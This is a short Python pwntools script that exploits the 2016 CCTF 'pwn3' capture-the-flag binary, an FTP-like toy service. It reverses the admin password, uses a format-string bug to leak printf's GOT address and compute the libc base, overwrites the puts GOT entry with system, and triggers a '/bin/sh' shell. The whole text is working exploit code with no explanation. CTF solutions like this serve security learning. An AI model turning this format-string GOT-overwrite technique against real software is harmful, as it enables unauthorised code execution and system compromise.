from pwn import *
p = process("./2016_CCTF_pwn3")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
elf = ELF("./2016_CCTF_pwn3")
def passadmin():
	password = "sysbdmin"
	password_real = ""
	for x in password:
		password_real += chr(ord(x)-1)
	p.sendlineafter("Rainism):",password_real)
	print password_real

def getcmd(name):
	p.sendlineafter("ftp>","get")
	p.sendlineafter("want to get:",name)
	
def putcmd(name,content):
	p.sendlineafter("ftp>","put")
	p.sendlineafter("want to upload:",name)
	p.sendlineafter("the content:",content)

def showcmd():
	p.sendlineafter("ftp>","dir")

passadmin()
offset = 7
puts_got = elf.got["printf"]
putcmd("aaa",p32(puts_got)+"%7$s")
getcmd("aaa")
info = p.recv(8)
printf_addr = u32(info[4:8])
libc.address = printf_addr - libc.symbols["printf"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
puts_got = elf.got["puts"]
payload = fmtstr_payload(7,{puts_got:system_addr})
putcmd("bbb",payload)
getcmd("bbb")
putcmd("/bin/sh;","sss")
showcmd()
p.interactive()
